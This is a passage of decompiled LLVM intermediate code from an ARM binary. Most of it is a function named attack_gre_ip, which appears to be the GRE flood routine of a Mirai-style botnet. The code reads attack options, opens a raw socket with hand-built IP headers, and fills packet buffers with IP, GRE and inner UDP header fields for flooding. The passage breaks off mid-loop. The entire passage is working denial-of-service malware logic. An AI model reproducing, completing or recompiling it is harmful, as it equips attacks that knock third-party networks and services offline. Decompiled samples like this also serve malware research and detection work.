  br i1 %v6_ad14, label %dec_label_pc_ad18, label %dec_label_pc_aa50

dec_label_pc_ad18:                                ; preds = %dec_label_pc_ad04, %entry, %dec_label_pc_ad24
  %v1_ad20 = phi i32 [ %v3_a7dc, %entry ], [ %v1_ad28, %dec_label_pc_ad24 ], [ %v2_ad08, %dec_label_pc_ad04 ]
  store i32 %v3_a66c, i32* %r4.global-to-local, align 4
  store i32 %v24_a66c, i32* %fp.global-to-local, align 4
  store i32 %v27_a66c, i32* %lr.global-to-local, align 4
  ret i32 %v1_ad20

dec_label_pc_ad24:                                ; preds = %dec_label_pc_a7ec
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v1_ad28 = call i32 @__GI___libc_close(i32 %v3_a7dc)
  store i32 %v1_ad28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad18

; uselistorder directives
  uselistorder i32 %v1_ad28, { 1, 0 }
  uselistorder i16 %v1_acbc, { 1, 0 }
  uselistorder i32 %v0_acbc, { 1, 0 }
  uselistorder i32 %v0_aca8, { 1, 0 }
  uselistorder i32 %v1_aca0, { 1, 0 }
  uselistorder i32 %v3_ac88, { 1, 0 }
  uselistorder i32 %v0_ac80, { 1, 0 }
  uselistorder i32 %v5_ac54, { 1, 0 }
  uselistorder i32 %v3_ac04, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v7_abec, { 2, 1, 0, 3 }
  uselistorder i32 %v1_abc4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_ab74, { 1, 0, 2 }
  uselistorder i32 %v4_ab70, { 1, 0 }
  uselistorder i32 %v2_ab50, { 1, 0 }
  uselistorder i1 %v2_acc4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_ac74, { 1, 0, 2, 3 }
  uselistorder i1 %v7_aa7c, { 2, 1, 0 }
  uselistorder i32 %v0_a9fc, { 1, 0, 2 }
  uselistorder i32 %v0_a914, { 1, 2, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v1_a868, { 2, 0, 1 }
  uselistorder i32 %v3_a860, { 2, 1, 0 }
  uselistorder i1 %v2_a838, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a82c, { 2, 1, 3, 0 }
  uselistorder i32 %v1_a828, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v0_a824, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_a820, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a81c, { 1, 0 }
  uselistorder i1 %v7_a80c, { 1, 0 }
  uselistorder i1 %v7_a7e0, { 1, 0 }
  uselistorder i32 %v3_a7dc, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_a7c8, { 2, 1, 0 }
  uselistorder i32 %v5_a7b8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_a784, { 1, 2, 0 }
  uselistorder i32 %v5_a764, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v6_a730, { 1, 0, 3, 2 }
  uselistorder i32 %v1_a718, { 1, 0 }
  uselistorder i32 %v1_a6f4, { 2, 1, 0 }
  uselistorder i32 %v5_a6ec, { 1, 0 }
  uselistorder i8 %v5_a6d0, { 0, 2, 1 }
  uselistorder i32 %v6_a6b0, { 1, 0 }
  uselistorder i32 %v2_a698, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 19, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 9, 10, 8, 12, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 22, 23, 24, 26, 25, 30, 27, 28, 29, 33, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 6, 5, 4, 1, 0, 3, 2, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_ad18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ab28, { 1, 0 }
  uselistorder label %dec_label_pc_aac4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa50, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_ad34 = load i32, i32* @r4, align 4
  %v24_ad34 = load i32, i32* @fp, align 4
  %v27_ad34 = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_ad60 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_ad64 = load i32, i32* @r4, align 4
  store i32 %v0_ad64, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ad70 = load i32, i32* @sb, align 4
  store i32 %v0_ad70, i32* %r3.global-to-local, align 4
  %v0_ad74 = load i32, i32* @r5, align 4
  %v5_ad78 = inttoptr i32 %v0_ad64 to i32*
  %v6_ad78 = call i32 @attack_get_opt_int(i32 %v0_ad74, i32* %v5_ad78, i32 2, i32 %v0_ad70)
  %v1_ad84 = urem i32 %v6_ad78, 256
  store i32 %v1_ad84, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ad90 = load i32, i32* @r4, align 4
  store i32 %v0_ad90, i32* %r1.global-to-local, align 4
  %v0_ad94 = load i32, i32* @r5, align 4
  %v5_ad98 = trunc i32 %v6_ad78 to i8
  %v6_ad9c = inttoptr i32 %v0_ad90 to i32*
  %v7_ad9c = call i32 @attack_get_opt_int(i32 %v0_ad94, i32* %v6_ad9c, i32 3, i32 65535)
  %v0_ada0 = load i32, i32* @r4, align 4
  store i32 %v0_ada0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_adb0 = load i32, i32* @r5, align 4
  %v5_adb4 = inttoptr i32 %v0_ada0 to i32*
  %v6_adb4 = call i32 @attack_get_opt_int(i32 %v0_adb0, i32* %v5_adb4, i32 4, i32 64)
  %v1_adbc = urem i32 %v6_adb4, 256
  store i32 %v1_adbc, i32* %ip.global-to-local, align 4
  %v0_adc0 = load i32, i32* @r4, align 4
  store i32 %v0_adc0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_adcc = load i32, i32* @r5, align 4
  %v6_add4 = inttoptr i32 %v0_adc0 to i32*
  %v7_add4 = call i32 @attack_get_opt_int(i32 %v0_adcc, i32* %v6_add4, i32 5, i32 1)
  %v1_ade0 = urem i32 %v7_add4, 256
  store i32 %v1_ade0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_adec = load i32, i32* @r4, align 4
  store i32 %v0_adec, i32* %r1.global-to-local, align 4
  %v0_adf0 = load i32, i32* @r5, align 4
  %v5_adf8 = inttoptr i32 %v0_adec to i32*
  %v6_adf8 = call i32 @attack_get_opt_int(i32 %v0_adf0, i32* %v5_adf8, i32 6, i32 65535)
  %v0_ae00 = load i32, i32* @r4, align 4
  store i32 %v0_ae00, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_adf8, i32* %fp.global-to-local, align 4
  %v0_ae10 = load i32, i32* @r5, align 4
  %v4_ae14 = inttoptr i32 %v0_ae00 to i32*
  %v5_ae14 = call i32 @attack_get_opt_int(i32 %v0_ae10, i32* %v4_ae14, i32 7, i32 65535)
  %v0_ae18 = load i32, i32* @r4, align 4
  store i32 %v0_ae18, i32* %r1.global-to-local, align 4
  %v0_ae1c = load i32, i32* @sb, align 4
  store i32 %v0_ae1c, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_ae14, i32* @r8, align 4
  %v0_ae28 = load i32, i32* @r5, align 4
  %v4_ae2c = inttoptr i32 %v0_ae18 to i32*
  %v5_ae2c = call i32 @attack_get_opt_int(i32 %v0_ae28, i32* %v4_ae2c, i32 %v0_ae1c, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ae3c = load i32, i32* @r4, align 4
  store i32 %v0_ae3c, i32* %r1.global-to-local, align 4
  %v0_ae40 = load i32, i32* @r5, align 4
  %v4_ae44 = inttoptr i32 %v0_ae3c to i32*
  %v5_ae44 = call i32 @attack_get_opt_int(i32 %v0_ae40, i32* %v4_ae44, i32 1, i32 1)
  %v1_ae4c = urem i32 %v5_ae44, 256
  store i32 %v1_ae4c, i32* %ip.global-to-local, align 4
  %v0_ae50 = load i32, i32* @r4, align 4
  store i32 %v0_ae50, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_ae58 = load i32, i32* @sb, align 4
  store i32 %v0_ae58, i32* %r3.global-to-local, align 4
  %v0_ae5c = load i32, i32* @r5, align 4
  %v5_ae64 = inttoptr i32 %v0_ae50 to i32*
  %v6_ae64 = call i32 @attack_get_opt_int(i32 %v0_ae5c, i32* %v5_ae64, i32 18, i32 %v0_ae58)
  %v0_ae6c = load i32, i32* @r4, align 4
  store i32 %v0_ae6c, i32* %r1.global-to-local, align 4
  %v2_ae70 = load i32, i32* @global_var_271b8.90, align 4
  store i32 %v2_ae70, i32* %r3.global-to-local, align 4
  store i32 %v6_ae64, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_ae7c = load i32, i32* @r5, align 4
  %v4_ae80 = inttoptr i32 %v0_ae6c to i32*
  %v5_ae80 = call i32 @attack_get_opt_int(i32 %v0_ae7c, i32* %v4_ae80, i32 24, i32 %v2_ae70)
  %v0_ae88 = load i32, i32* @sb, align 4
  %v1_ae8c = inttoptr i32 %v0_ae88 to i32*
  %v2_ae8c = call i32 @__GI_time(i32* %v1_ae8c)
  %v1_ae90 = load i32, i32* @r6, align 4
  %v2_ae90 = add i32 %v1_ae90, %v2_ae8c
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_aea4 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_aea8 = icmp eq i32 %v3_aea4, -1
  store i1 %v7_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aea8, label %dec_label_pc_b378, label %dec_label_pc_aeb4

dec_label_pc_aeb4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aebc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aebc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_aec4 = load i32, i32* @sb, align 4
  store i32 %v0_aec4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aed0 = call i32 @__GI_setsockopt(i32 %v3_aea4, i32 %v0_aec4, i32 3, i32 %v6_aebc, i32 4)
  %v7_aed4 = icmp eq i32 %v5_aed0, -1
  store i1 %v7_aed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aed4, label %dec_label_pc_b384, label %dec_label_pc_aedc

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aeb4
  %v0_aedc = load i32, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_aef0 = load i32, i32* @r8, align 4
  %v3_aef4 = mul i32 %v7_ad9c, 65536
  store i32 %v3_aef4, i32* %r1.global-to-local, align 4
  %v0_aef8 = load i32, i32* @r7, align 4
  %v1_aef8 = urem i32 %v0_aef8, 256
  store i32 %v1_aef8, i32* @r7, align 4
  %v3_aefc = urem i32 %v0_aedc, 65536
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v3_af00 = urem i32 %v0_aef0, 65536
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v2_af04 = icmp eq i32 %arg2, 0
  store i1 %v2_af04, i1* %cpsr_z.global-to-local, align 1
  %v0_af14 = load i32, i32* @sb, align 4
  store i32 %v0_af14, i32* %stack_var_-44, align 4
  %v3_af18 = urem i32 %v7_ad9c, 65536
  store i32 %v3_af18, i32* @fp, align 4
  br i1 %v2_af04, label %dec_label_pc_b10c.preheader, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_aedc
  %v3_aef0 = mul i32 %v0_aef0, 65536
  %v3_aedc = mul i32 %v0_aedc, 65536
  %v3_af2c = mul i32 %v5_ae2c, 65536
  %v1_af30 = add i32 %v3_af2c, 3407872
  %tmp68 = udiv i32 %v1_af30, 256
  %v3_af3c = and i32 %tmp68, 65280
  %v7_ad9c.not = or i32 %v7_ad9c, -65536
  %v1_af40 = xor i32 %v7_ad9c.not, 65535
  %v4_af44 = udiv i32 %v1_af30, 16777216
  %v5_af44 = or i32 %v3_af3c, %v4_af44
  store i32 %v3_aef4, i32* %r3.global-to-local, align 4
  %tmp69 = mul i32 %v7_ad9c, 256
  %v3_af5c = and i32 %tmp69, 65280
  %tmp70 = mul nsw i32 %v1_af40, 256
  %v3_af60 = and i32 %tmp70, 65280
  %tmp71 = udiv i32 %v7_ad9c, 256
  %v4_af64 = urem i32 %tmp71, 256
  %v5_af64 = or i32 %v4_af64, %v3_af5c
  %tmp72 = udiv i32 %v1_af40, 256
  %v4_af6c = urem i32 %tmp72, 256
  %v5_af6c = or i32 %v4_af6c, %v3_af60
  store i32 %v5_af6c, i32* @r6, align 4
  store i32 %v3_aedc, i32* %r1.global-to-local, align 4
  store i32 %v3_aef0, i32* %r2.global-to-local, align 4
  %v1_af80 = add i32 %v3_af2c, 524288
  %tmp73 = mul i32 %v0_aedc, 256
  %v3_af84 = and i32 %tmp73, 65280
  %v1_af88 = add i32 %v3_af2c, 1835008
  store i32 %v1_af88, i32* @r5, align 4
  %tmp74 = mul i32 %v0_aef0, 256
  %v3_af8c = and i32 %tmp74, 65280
  %v3_af94 = udiv i32 %v1_af88, 256
  %tmp75 = udiv i32 %v0_aedc, 256
  %v4_af98 = urem i32 %tmp75, 256
  %v5_af98 = or i32 %v4_af98, %v3_af84
  %tmp76 = udiv i32 %v0_aef0, 256
  %v4_af9c = urem i32 %tmp76, 256
  %v5_af9c = or i32 %v4_af9c, %v3_af8c
  store i32 %v5_af9c, i32* %ip.global-to-local, align 4
  %v1_afa0 = and i32 %v3_af94, 65280
  %tmp77 = udiv i32 %v1_af80, 256
  %v3_afa4 = and i32 %tmp77, 65280
  store i32 %v3_afa4, i32* @lr, align 4
  %v4_afb8 = udiv i32 %v1_af80, 16777216
  %v5_afb8 = or i32 %v3_afa4, %v4_afb8
  store i32 %v5_afb8, i32* @r7, align 4
  %v4_afbc = udiv i32 %v1_af88, 16777216
  %v5_afbc = or i32 %v1_afa0, %v4_afbc
  store i32 %v5_afbc, i32* @r8, align 4
  store i32 %v0_af14, i32* @r4, align 4
  %v4_b014 = sext i8 %v5_ad98 to i32
  %v1_b020 = trunc i32 %v6_adb4 to i8
  %sext = mul nuw i32 %v5_af44, 65536
  %v4_b028 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_af64, 65536
  %v4_b02c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_af6c, 65536
  %v4_b094 = sdiv i32 %sext9, 65536
  %v2_b0c4 = icmp eq i32 %v1_aef8, 0
  %sext10 = mul nuw i32 %v5_af98, 65536
  %v4_b0e8 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_af9c, 65536
  %v4_b0f0 = sdiv i32 %sext11, 65536
  %extract.t = trunc i32 %v4_b028 to i16
  br label %dec_label_pc_afc4

dec_label_pc_afc4:                                ; preds = %bb82, %dec_label_pc_af28
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_afd0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_ad60, i32* %ip.global-to-local, align 4
  %v2_afdc = load i32, i32* @r4, align 4
  %v5_afdc = mul i32 %v2_afdc, 4
  %v6_afdc = add i32 %v5_afdc, %v2_ad60
  %v7_afdc = inttoptr i32 %v6_afdc to i32*
  store i32 %v2_afd0, i32* %v7_afdc, align 4
  %v3_afe0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_afe0, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* %ip.global-to-local, align 4
  %v4_afe4 = mul i32 %v3_afe0, 4
  %v5_afe4 = add i32 %v0_afe4, %v4_afe4
  %v6_afe4 = inttoptr i32 %v5_afe4 to i32*
  %v7_afe4 = load i32, i32* %v6_afe4, align 4
  store i32 %v7_afe4, i32* %r4.global-to-local, align 4
  %v1_afe8 = inttoptr i32 %v7_afe4 to i8*
  %v2_afe8 = load i8, i8* %v1_afe8, align 1
  %tmp = urem i8 %v2_afe8, 16
  %v1_afec = zext i8 %tmp to i32
  %v1_aff0 = or i32 %v1_afec, 64
  store i32 %v1_aff0, i32* %r2.global-to-local, align 4
  %v1_aff4 = trunc i32 %v1_aff0 to i8
  store i8 %v1_aff4, i8* %v1_afe8, align 1
  %v0_aff8 = load i32, i32* %r3.global-to-local, align 4
  %v5_affc = mul i32 %v0_aff8, 24
  store i32 %v5_affc, i32* %r1.global-to-local, align 4
  %v0_b000 = load i32, i32* %r4.global-to-local, align 4
  %v1_b000 = inttoptr i32 %v0_b000 to i8*
  %v2_b000 = load i8, i8* %v1_b000, align 1
  %v1_b004 = and i8 %v2_b000, -16
  %v1_b008 = or i8 %v1_b004, 5
  store i32 %v1_ade0, i32* %lr.global-to-local, align 4
  store i8 %v1_b008, i8* %v1_b000, align 1
  store i32 %v4_b014, i32* %r2.global-to-local, align 4
  %v2_b018 = load i32, i32* %r4.global-to-local, align 4
  %v3_b018 = add i32 %v2_b018, 1
  %v4_b018 = inttoptr i32 %v3_b018 to i8*
  store i8 %v5_ad98, i8* %v4_b018, align 1
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v2_b020 = load i32, i32* %r4.global-to-local, align 4
  %v3_b020 = add i32 %v2_b020, 8
  %v4_b020 = inttoptr i32 %v3_b020 to i8*
  store i8 %v1_b020, i8* %v4_b020, align 1
  %v0_b024 = load i32, i32* %lr.global-to-local, align 4
  %v2_b024 = icmp eq i32 %v0_b024, 0
  store i1 %v2_b024, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b028, i32* %ip.global-to-local, align 4
  store i32 %v4_b02c, i32* %lr.global-to-local, align 4
  br i1 %v2_b024, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_afc4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_b034 = load i32, i32* %r4.global-to-local, align 4
  %v4_b034 = add i32 %v3_b034, 6
  %v5_b034 = inttoptr i32 %v4_b034 to i16*
  store i16 64, i16* %v5_b034, align 2
  %v0_b038.pre = load i32, i32* %ip.global-to-local, align 4
  %extract.t27 = trunc i32 %v0_b038.pre to i16
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_afc4, %bb
  %v0_b038.off0 = phi i16 [ %extract.t, %dec_label_pc_afc4 ], [ %extract.t27, %bb ]
  %v2_b038 = load i32, i32* %r4.global-to-local, align 4
  %v3_b038 = add i32 %v2_b038, 2
  %v4_b038 = inttoptr i32 %v3_b038 to i16*
  store i16 %v0_b038.off0, i16* %v4_b038, align 2
  %v0_b03c = load i32, i32* %r4.global-to-local, align 4
  %v1_b03c = add i32 %v0_b03c, 20
  store i32 %v1_b03c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v3_b048 = add i32 %v0_b03c, 9
  %v4_b048 = inttoptr i32 %v3_b048 to i8*
  store i8 47, i8* %v4_b048, align 1
  %v0_b04c = load i32, i32* %lr.global-to-local, align 4
  %v1_b04c = trunc i32 %v0_b04c to i16
  %v2_b04c = load i32, i32* %r4.global-to-local, align 4
  %v3_b04c = add i32 %v2_b04c, 4
  %v4_b04c = inttoptr i32 %v3_b04c to i16*
  store i16 %v1_b04c, i16* %v4_b04c, align 2
  %v0_b050 = load i32, i32* %ip.global-to-local, align 4
  %v1_b050 = trunc i32 %v0_b050 to i16
  %v2_b050 = load i32, i32* %r2.global-to-local, align 4
  %v3_b050 = add i32 %v2_b050, 2
  %v4_b050 = inttoptr i32 %v3_b050 to i16*
  store i16 %v1_b050, i16* %v4_b050, align 2
  store i32 %v5_ae80, i32* %lr.global-to-local, align 4
  %v0_b058 = load i32, i32* %r4.global-to-local, align 4
  %v1_b058 = add i32 %v0_b058, 24
  %v2_b058 = inttoptr i32 %v1_b058 to i8*
  %v3_b058 = load i8, i8* %v2_b058, align 1
  %v4_b058 = zext i8 %v3_b058 to i32
  store i32 %v4_b058, i32* %r2.global-to-local, align 4
  %v2_b05c = add i32 %v0_b058, 12
  %v3_b05c = inttoptr i32 %v2_b05c to i32*
  store i32 %v5_ae80, i32* %v3_b05c, align 4
  %v0_b060 = load i32, i32* %r2.global-to-local, align 4
  %v1_b060 = and i32 %v0_b060, -241
  %v1_b064 = or i32 %v1_b060, 64
  store i32 %v1_b064, i32* %r2.global-to-local, align 4
  %v0_b068 = load i32, i32* %r1.global-to-local, align 4
  %v1_b068 = load i32, i32* @sl, align 4
  %v2_b068 = add i32 %v1_b068, %v0_b068
  store i32 %v2_b068, i32* %r1.global-to-local, align 4
  %v1_b06c = add i32 %v2_b068, 16
  %v2_b06c = inttoptr i32 %v1_b06c to i32*
  %v3_b06c = load i32, i32* %v2_b06c, align 4
  store i32 %v3_b06c, i32* %r1.global-to-local, align 4
  %v1_b070 = trunc i32 %v1_b064 to i8
  %v2_b070 = load i32, i32* %r4.global-to-local, align 4
  %v3_b070 = add i32 %v2_b070, 24
  %v4_b070 = inttoptr i32 %v3_b070 to i8*
  store i8 %v1_b070, i8* %v4_b070, align 1
  %v0_b074 = load i32, i32* %r4.global-to-local, align 4
  %v1_b074 = add i32 %v0_b074, 24
  %v2_b074 = inttoptr i32 %v1_b074 to i8*
  %v3_b074 = load i8, i8* %v2_b074, align 1
  %v1_b078 = and i8 %v3_b074, -16
  %v1_b07c = or i8 %v1_b078, 5
  store i8 %v1_b07c, i8* %v2_b074, align 1
  %v0_b084 = load i32, i32* %r1.global-to-local, align 4
  %v1_b084 = load i32, i32* %r4.global-to-local, align 4
  %v2_b084 = add i32 %v1_b084, 16
  %v3_b084 = inttoptr i32 %v2_b084 to i32*
  store i32 %v0_b084, i32* %v3_b084, align 4
  store i32 %v4_b014, i32* %r1.global-to-local, align 4
  %v0_b08c = load i32, i32* %r4.global-to-local, align 4
  %v1_b08c = add i32 %v0_b08c, 24
  store i32 %v1_b08c, i32* @r5, align 4
  %v3_b090 = add i32 %v0_b08c, 25
  %v4_b090 = inttoptr i32 %v3_b090 to i8*
  store i8 %v5_ad98, i8* %v4_b090, align 1
  store i32 %v4_b094, i32* %r2.global-to-local, align 4
  %v0_b098 = load i32, i32* @r8, align 4
  %v1_b098 = trunc i32 %v0_b098 to i16
  %v2_b098 = load i32, i32* @r5, align 4
  %v3_b098 = add i32 %v2_b098, 2
  %v4_b098 = inttoptr i32 %v3_b098 to i16*
  store i16 %v1_b098, i16* %v4_b098, align 2
  %v0_b09c = load i32, i32* %r2.global-to-local, align 4
  %v1_b09c = trunc i32 %v0_b09c to i16
  %v2_b09c = load i32, i32* @r5, align 4
  %v3_b09c = add i32 %v2_b09c, 4
  %v4_b09c = inttoptr i32 %v3_b09c to i16*
  store i16 %v1_b09c, i16* %v4_b09c, align 2
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0a4, label %bb79, label %bb78

bb78:                                             ; preds = %.thread
  store i32 64, i32* %ip.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %.thread, %bb78
  %v2_b0a8 = load i32, i32* @r5, align 4
  %v3_b0a8 = add i32 %v2_b0a8, 8
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i8*
  store i8 %v1_b020, i8* %v4_b0a8, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b0b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0b0, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_b0b0 = load i32, i32* %ip.global-to-local, align 4
  %v2_b0b0 = trunc i32 %v1_b0b0 to i16
  %v3_b0b0 = load i32, i32* @r5, align 4
  %v4_b0b0 = add i32 %v3_b0b0, 6
  %v5_b0b0 = inttoptr i32 %v4_b0b0 to i16*
  store i16 %v2_b0b0, i16* %v5_b0b0, align 2
  %v0_b0b4.pre = load i32, i32* %r3.global-to-local, align 4
  %extract.t28 = trunc i32 %v0_b0b4.pre to i8
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_b0b4.off0 = phi i8 [ 17, %bb79 ], [ %extract.t28, %bb80 ]
  %v2_b0b4 = load i32, i32* @r5, align 4
  %v3_b0b4 = add i32 %v2_b0b4, 9
  %v4_b0b4 = inttoptr i32 %v3_b0b4 to i8*
  store i8 %v0_b0b4.off0, i8* %v4_b0b4, align 1
  %v0_b0b8 = call i32 @rand_next()
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b0c4, i1* %cpsr_z.global-to-local, align 1
  %v1_b0c8 = sub i32 1023, %v0_b0b8
  store i32 %v1_b0c8, i32* %r3.global-to-local, align 4
  br i1 %v2_b0c4, label %.thread12, label %.thread13

.thread12:                                        ; preds = %bb81
  %v2_b0d0 = load i32, i32* @r5, align 4
  %v3_b0d0 = add i32 %v2_b0d0, 16
  %v4_b0d0 = inttoptr i32 %v3_b0d0 to i32*
  store i32 %v1_b0c8, i32* %v4_b0d0, align 4
  br label %bb82

.thread13:                                        ; preds = %bb81
  %v1_b0cc = load i32, i32* %r4.global-to-local, align 4
  %v2_b0cc = add i32 %v1_b0cc, 16
  %v3_b0cc = inttoptr i32 %v2_b0cc to i32*
  %v4_b0cc = load i32, i32* %v3_b0cc, align 4
  store i32 %v4_b0cc, i32* %r3.global-to-local, align 4
  %v2_b0d4 = load i32, i32* @r5, align 4
  %v3_b0d4 = add i32 %v2_b0d4, 16
  %v4_b0d4 = inttoptr i32 %v3_b0d4 to i32*
  store i32 %v4_b0cc, i32* %v4_b0d4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread12, %.thread13
  %v1_b0d8 = load i32, i32* @r5, align 4
  %v2_b0d8 = add i32 %v1_b0d8, 12
  %v3_b0d8 = inttoptr i32 %v2_b0d8 to i32*
  store i32 %v0_b0b8, i32* %v3_b0d8, align 4
  %v3_b0dc = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_b0e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b0e4 = add i32 %v0_b0e4, 44
  store i32 %v1_b0e4, i32* @r6, align 4
  store i32 %v4_b0e8, i32* %r2.global-to-local, align 4
  %v1_b0ec = add i32 %v3_b0dc, 1
  store i32 %v1_b0ec, i32* @r4, align 4
  store i32 %v4_b0f0, i32* %r3.global-to-local, align 4
  %v9_b0f4 = icmp eq i32 %v1_b0ec, %arg2
  store i1 %v9_b0f4, i1* %cpsr_z.global-to-local, align 1
  %v0_b0f8 = load i32, i32* @r7, align 4
  %v1_b0f8 = trunc i32 %v0_b0f8 to i16
  %v3_b0f8 = add i32 %v0_b0e4, 48
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i16*
  store i16 %v1_b0f8, i16* %v4_b0f8, align 2
  %v0_b0fc = load i32, i32* %r2.global-to-local, align 4
  %v1_b0fc = trunc i32 %v0_b0fc to i16
  %v2_b0fc = load i32, i32* @r6, align 4
